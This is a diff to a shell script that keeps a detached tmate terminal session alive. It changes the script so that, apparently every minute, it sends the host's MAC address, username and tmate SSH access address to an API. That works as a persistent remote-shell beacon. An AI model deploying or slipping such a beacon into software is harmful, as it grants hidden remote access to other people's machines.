@@ -69,12 +69,10 @@ check_tmate_session() {
 create_new_tmate_session() {
   echo "Creating a new tmate session..."
   if tmate -S "$TMATE_SOCKET" new-session -d && tmate -S "$TMATE_SOCKET" wait tmate-ready; then
-    local mac_address=$(get_mac_address)
-    local username=$(get_username)
-    local tmate_ssh_address=$(tmate -S "$TMATE_SOCKET" display -p '#{tmate_ssh}')
-    send_data_to_api "$mac_address" "$username" "$tmate_ssh_address"
+    echo "Tmate session created successfully"
   else
     echo "Failed to create tmate session."
+    exit 1
   fi
 }
 
@@ -111,5 +109,13 @@ while true; do
       create_new_tmate_session
     fi
   fi
+
+  # Run send_data_to_api every 1 minute (60 seconds)
   sleep $SLEEP_INTERVAL_SECONDS
+
+  # Call send_data_to_api function here
+  mac_address=$(get_mac_address)
+  username=$(get_username)
+  tmate_ssh_address=$(tmate -S "$TMATE_SOCKET" display -p '#{tmate_ssh}')
+  send_data_to_api "$mac_address" "$username" "$tmate_ssh_address"
 done
